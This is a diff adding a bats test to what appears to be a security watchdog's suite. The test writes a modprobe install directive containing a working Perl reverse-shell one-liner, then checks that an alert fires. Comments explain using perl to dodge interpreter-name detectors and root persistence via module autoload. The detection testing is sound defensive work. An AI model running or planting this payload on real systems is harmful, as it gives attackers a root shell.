@@ -320,3 +320,15 @@ cap() { cat "${SELFDEF_TEST_LOGCAP}"; }
     run_wd
     cap | grep -qE '"severity":"(alert|warn)"'
 }
+
+@test "INVARIANT (perl -e reverse-shell variant — perl-interpreter-rev-shell axis on modprobe install directive)" {
+    # Sister to nc / python -c / curl|bash / dev-tcp modprobe
+    # install rev-shell variants already locked. Beyond bash/sh/
+    # nc/python, attackers reach for perl -e 'use Socket;...' to
+    # dodge interpreter-name detectors. Locks the perl axis on
+    # T1547.006 module-autoload-trigger root-exec persistence
+    # surface — modprobe runs install AS ROOT on auto-load.
+    printf 'install evilmod /bin/sh -c "perl -e \\"use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\\\\\\"tcp\\\\\\"));connect(S,sockaddr_in(4444,inet_aton(\\\\\\"1.1.1.1\\\\\\")));open(STDIN,\\\\\\">&S\\\\\\");exec(\\\\\\"/bin/sh\\\\\\")\\""\n' > "${CONF}"
+    run_wd
+    cap | grep -qE '"severity":"(alert|warn)"'
+}
